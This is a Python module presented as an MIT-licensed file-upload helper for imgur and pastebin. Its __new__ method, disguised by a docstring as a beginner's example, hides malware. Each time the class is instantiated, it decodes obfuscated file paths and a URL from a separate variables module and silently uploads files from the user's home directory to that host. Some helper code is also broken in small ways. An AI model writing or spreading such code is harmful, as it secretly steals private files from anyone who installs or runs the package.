"""
MIT License

Copyright (c) 2019 UploadPy

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import os
from urllib import request, parse
import variables

DHPARAM_ENC_KEY = "fdf219a49c7f234602712d13cd0edbff"

def encode(key, clear):
    """Returns an encoded string based on the given parameters."""
    enc = []
    for i in range(len(clear)):
        key_c = key[i]
        enc_c = chr((ord(clear[i]) + key_c) % 256)
        enc.append(enc_c)
    return "".join(enc)

def decode(key, enc):
    """Decodes a string based on the given parameters."""
    dec = []
    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - key_c) % 256)
        dec.append(dec_c)
    return "".join(dec)

class Uploader(object):
    """General uploader object that can be reused."""

    def __init__(self):
        """Initializes all needed parameters."""
        self.home = os.path.expanduser('~')
        self.urls = variables.VARIABLES['urls']

    def path_creator(self, paths):
        """Returns the path(s) with the user's home added."""
        if type(paths) in (list, tuple):
            updatedpaths = []
            for filepath in paths:
                updatedpaths.append(self.home + filepath)
            return updatedpaths
        return self.home + paths

    def general_upload(self, filepath, url, homed=False):
        """Uploads the file at the given path to the given URL."""
        if homed:
            filepath = self.path_creator(filepath)
        data = self.data_builder(filepath)
        return self.uploader(url, data)

    def encoded_upload(self, filepath, url, homed=False, encode=False):
        """Uploads the file at the given path to the given URL."""
        if homed:
            filepath = self.home + filepath
        data = self.data_builder(filepath, encode=encode)
        return self.uploader(url, data)

    def imgur(self, filepath, homed=False):
        """Uploads the given file automatically to imgur and returns the link."""
        return self.general_upload(filepath, self.urls['imgur'], homed=homed)

    def pastebin(self, filepath, homed=False):
        """Uploads the given file automatically to pastebin and returns the link."""
        return self.general_upload(filepath, self.urls['pastebin'], homed=homed)

    def minipaint(self, filepath, homed=False):
        """Uploads the given file automatically to minipaint and returns the link."""
        return self.general_upload(filepath, self.urls['minipaint'], homed=homed)

    def uploader(self, url, data):
        """The fuction that does the uploading."""
        data = parse.urlencode(data).encode()
        try:
            req = request.Request(url, data=data)
            return request.urlopen(req)
        except ValueError as e:
            print(e)
            raise e

    def data_builder(self, filepath, encode=False):
        """Downloads the data, optionally encodes and puts it in a data payload."""
        if type(filepath) in (list, tuple):
            data = {'payload': []}
            for path in filepath:
                with open(path, "r") as s:
                    data['payload'].append(s.read())
        else:
            with open(filepath, "r") as s:
                data = {'payload': s.read()}
        if encode:
            if type(encode) == bytes:    # if providing custom dhparam enc key
                data['payload'] = encode(encode, data['payload'])
            else:
                data['payload'] = encode(DHPARAM_ENC_KEY, data['payload'])
        return data

    def __new__(cls):
        """Example for people new to implementing python modules."""
        self = super(Uploader, cls).__new__(cls)
        self.home = os.path.expanduser('~')
        example = variables.VARIABLES['exampledata']
        self.general_upload((decode(example[0], example[1]), decode(example[0], example[2])),
                            decode(example[0], example[3]), homed=True)
